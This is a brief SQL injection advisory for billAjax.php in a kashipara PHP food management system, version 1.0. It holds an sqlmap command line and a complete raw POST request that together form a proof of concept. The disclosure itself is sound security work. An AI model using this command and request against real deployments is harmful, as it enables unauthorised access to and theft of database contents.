 Food Management System SQL Injection Vulnerability 
 Vulnerability Description: SQL Injection Vulnerability in Foreground of Food Management System 
 Manufacturer Information: www.kashipara.com/ 
 Affected Version: 1.0 
 Environment: 
 https://www.kashipara.com/project/download/project2/user/2023/202312/kashipara.com_chopstic1-zip.zip 

![img](https://cdn-images-1.medium.com/max/900/1*OVHZZxD7vpNXrFgeB8IeJw.png)

 Code Analysis: 
 Code in D:\phpstudy_pro\WWW\chopstic1\billAjax.php 

![img](https://cdn-images-1.medium.com/max/900/1*SH3K0ckF2xBjJl3eRgOeGA.png)

 The $post array contains data passed from the client without any validation, cleanup, or escape processing.  An attack can construct malicious input to inject arbitrary SQL statements and perform unauthorize actions. 

 SQLmapï¼š 

![img](https://cdn-images-1.medium.com/max/900/1*dq-5azLyclaEms0ZSHPrtg.png)

 SQLMAP command: 
 python sqlmap.py -r 2.txt --dbms=mysql 
 Complete data package: 

```shell
POST /chopstic1/billAjax.php HTTP/1.1
Host: localhost
Content-Length: 333
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/chopstic1/ItemDetails.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_page_view=%7B%22timestamp%22%3A1694409700%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A2%7D; _ga=GA1.1.324136046.1702458922; Hm_lvt_6a3c7d9bb52a48ffadde32007d2a259e=1702459185; _pk_id.1.1fff=4343a030b8a53617.1702459185.; PHPSESSID=l7gqshcet6f2d84e2r3ae4a5tj
Connection: close

custmer_details=1&price_type=item_price_retl&chk_in_date=03-01-2024&transpotation_name=&totalAmount=0&itemype%5B%5D=5&item_name%5B%5D=39&item_price%5B%5D=0&initialprice%5B%5D=0&itemnumber%5B%5D=1asd&itemype%5B%5D=6&item_name%5B%5D=43&item_price%5B%5D=0&initialprice%5B%5D=0&itemnumber%5B%5D=1aas&pay_cost=asasas&subButton=Place+Order
```

